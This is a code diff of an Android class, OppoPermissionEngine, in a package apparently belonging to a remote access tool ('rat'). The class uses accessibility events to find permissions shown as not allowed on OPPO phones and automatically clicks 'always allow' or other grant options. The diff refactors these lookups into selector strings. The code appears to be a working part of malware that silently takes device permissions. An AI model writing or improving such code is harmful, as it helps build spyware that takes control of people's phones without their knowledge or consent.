@@ -3,8 +3,6 @@ package com.vendor.rat.auto.engine.vendor;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
-import com.vendor.rat.auto.condition.CombineFilter;
-import com.vendor.rat.auto.condition.StringCondition;
 import com.vendor.rat.auto.engine.AutoEngine;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.auto.util.GkdSelectorHelper;
@@ -106,9 +104,7 @@ public class OppoPermissionEngine extends AutoEngine {
         UiNode root = k();
         if (root == null) return false;
         // 检查是否有分组标题 "不允许"
-        UiNode denied = root.findOneByCombine(CombineFilter.and(
-            StringCondition.className("android.widget.TextView"),
-            StringCondition.textEquals("不允许")));
+        UiNode denied = GkdSelectorHelper.findOne(root, "TextView[text=\"不允许\"]");
         return denied != null;
     }
 
@@ -138,9 +134,7 @@ public class OppoPermissionEngine extends AutoEngine {
 
         // 找到"不允许"分组下的权限条目
         // 策略: 遍历所有 clickable 行，找到状态为"不允许"的
-        List<UiNode> allNodes = root.findAllByCombine(CombineFilter.and(
-            StringCondition.className("android.widget.TextView"),
-            StringCondition.textEquals("不允许")));
+        List<UiNode> allNodes = GkdSelectorHelper.findAll(root, "TextView[text=\"不允许\"]");
 
         if (allNodes == null || allNodes.isEmpty()) {
             Log.d(TAG, "无'不允许'权限，所有权限已授权");
@@ -194,11 +188,8 @@ public class OppoPermissionEngine extends AutoEngine {
 
         // 按优先级查找允许选项: 始终允许 > 使用时允许 > 允许
         for (String allowText : ALLOW_PRIORITY) {
-            UiNode row = root.findOneByCombineWithChild(
-                CombineFilter.clickable(),
-                CombineFilter.and(
-                    StringCondition.className("android.widget.TextView"),
-                    StringCondition.textEquals(allowText)));
+            UiNode row = GkdSelectorHelper.findOne(root,
+                "[clickable=true] > TextView[text=\"" + allowText + "\"]");
             if (row != null) {
                 row.click();
                 grantedCount++;
